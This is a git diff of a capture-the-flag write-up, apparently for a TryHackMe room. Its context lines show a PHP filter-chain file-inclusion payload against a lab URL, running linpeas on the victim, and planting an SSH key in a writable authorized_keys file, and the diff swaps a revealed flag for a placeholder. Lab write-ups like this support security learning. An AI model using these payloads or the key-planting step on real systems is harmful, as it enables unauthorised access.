@@ -195,7 +195,7 @@ $conn->close();
   }
 ?>
 ```
-9. After I tried all to manually chain all the possible PHP wrappers, I found a tool for the job, a great resource PHP filter chain generator: https://github.com/synacktiv/php_filter_chain_generator
+9. After I tried to manually chain all the possible PHP wrappers, I found a tool for the job, a great resource PHP filter chain generator: https://github.com/synacktiv/php_filter_chain_generator
 10. With the tool set up and in place I have generated first POC, a simple PHP script`<?php phpinfo(); ?>` transformed with the tool like `python3 php_filter_chain.py --chain '<?php phpinfo(); ?>  '` and the output I appended as a value to my vulnerable URL parameter (no need to display the entire string)
 ```sh
 http://10.10.7.200/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|[...]
@@ -211,6 +211,7 @@ http://10.10.93.52/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2
 13. Now we have a revshell and the next step will be to stabilize it
 14. I have spawn a python server and transfer `linpeas.sh` to `/tmp` folder on the victim machine, and run it
 15. One of the vulnerabilities flagged is regarding `/home/comte/.ssh/authorized_keys` location as being writable by our user. To exploit this we can simply generate a new key pair locally and write the public key on the server. On our machine:
+
 ```sh
 ssh-keygen -t rsa #generate new key pair
 
@@ -220,6 +221,7 @@ cat id_rsa.pub # get the content of the public key and copy it
 
 ```
 16. O the victim machine:
+
 ```sh
 echo 'content copied of the id_rsa.pub' > /home/comte/.ssh/authorized_keys
 ```
@@ -228,7 +230,7 @@ echo 'content copied of the id_rsa.pub' > /home/comte/.ssh/authorized_keys
 ```
 ssh comte@10.10.93.52 -i id_rsa
 ```
-2. Once on the machine we can get the content of the user flag: THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
+2. Once on the machine we can get the content of the user flag: **[UserFlag]**
 
 ### Privilege escalation
 1. Run a simple `sudo -l` will return:
